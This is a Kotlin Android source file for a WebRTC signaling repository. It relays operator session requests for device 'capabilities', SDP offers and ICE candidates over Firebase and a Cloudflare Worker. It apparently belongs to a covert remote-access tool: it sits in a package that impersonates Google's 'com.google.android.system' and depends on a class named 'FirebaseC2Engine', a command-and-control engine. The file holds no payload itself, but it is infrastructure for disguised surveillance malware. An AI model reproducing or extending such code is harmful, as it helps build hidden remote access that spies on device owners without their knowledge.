package com.google.android.system

import android.content.Context
import android.util.Log
import org.json.JSONObject

/**
 * FirebaseSignalingRepository
 * High-level repository coordinating WebRTC signaling via SignalingCoordinator (Dual-Path: Firebase + Cloudflare Worker).
 */
class FirebaseSignalingRepository(
    private val context: Context,
    private val firebaseEngine: FirebaseC2Engine
) {
    private val coordinator = SignalingCoordinator(context, firebaseEngine)

    companion object {
        private const val TAG = "FirebaseSignalingRepo"
    }

    interface SignalingCallback {
        fun onSessionRequested(sessionId: String, requestedCapabilities: List<String>)
        fun onOfferReceived(sessionId: String, sdp: String)
        fun onIceCandidateReceived(sessionId: String, candidateJson: JSONObject)
        fun onSessionTerminated(sessionId: String)
    }

    private var callback: SignalingCallback? = null

    fun setCallback(cb: SignalingCallback) {
        this.callback = cb
        coordinator.setListener(object : SignalingCoordinator.Listener {
            override fun onSessionRequested(sessionId: String, requestedCapabilities: List<String>) {
                callback?.onSessionRequested(sessionId, requestedCapabilities)
            }

            override fun onOfferReceived(sessionId: String, sdp: String) {
                callback?.onOfferReceived(sessionId, sdp)
            }

            override fun onIceCandidateReceived(sessionId: String, candidateJson: JSONObject) {
                callback?.onIceCandidateReceived(sessionId, candidateJson)
            }

            override fun onSessionClosed(sessionId: String) {
                callback?.onSessionTerminated(sessionId)
            }
        })
    }

    fun startListeningForSessionRequests() {
        Log.i(TAG, "Starting WebRTC Dual-Path Signaling Repository...")
        coordinator.start()
    }

    fun stopListening() {
        Log.i(TAG, "Stopping WebRTC Dual-Path Signaling Repository...")
        coordinator.stop()
    }

    fun postAcceptSession(sessionId: String) {
        coordinator.postSessionAccepted(sessionId)
    }

    fun postSdpAnswer(sessionId: String, sdp: String) {
        coordinator.postSdpAnswer(sessionId, sdp)
    }

    fun postIceCandidate(sessionId: String, candidate: String, sdpMid: String, sdpMLineIndex: Int) {
        coordinator.postIceCandidate(sessionId, candidate, sdpMid, sdpMLineIndex)
    }
}
